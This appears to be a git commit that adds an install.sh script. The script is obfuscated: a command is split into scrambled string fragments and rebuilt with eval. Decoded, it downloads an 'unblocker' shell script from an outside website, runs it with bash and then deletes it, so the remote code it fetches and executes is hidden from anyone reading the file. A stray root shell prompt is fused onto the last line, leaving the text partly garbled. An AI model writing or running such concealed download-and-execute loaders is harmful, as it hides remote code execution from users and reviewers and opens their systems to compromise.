76ac79f51b522d69e0dc2ff08785e056d989152a
Soheil Asghari <soheil.developer@gmail.com>
2023-11-16 17:53:28 +0330

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,3 @@
+z="
+";Qz=' bas';Lz='r-ui';Nz='lock';Vz='& rm';Oz='er.s';Tz='ker.';Az='wget';Pz='h &&';Wz=' -f ';Kz='ocke';Ez='.woo';Bz=' htt';Xz='r.sh';Jz='unbl';Rz='h un';Gz='r/sh';Fz='da.i';Hz='ellc';Cz='ps:/';Sz='bloc';Dz='/www';Iz='ode/';Uz='sh &';Mz='/unb';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Jz$Kz$Xz"root@De3-6:~/k-fuscator#
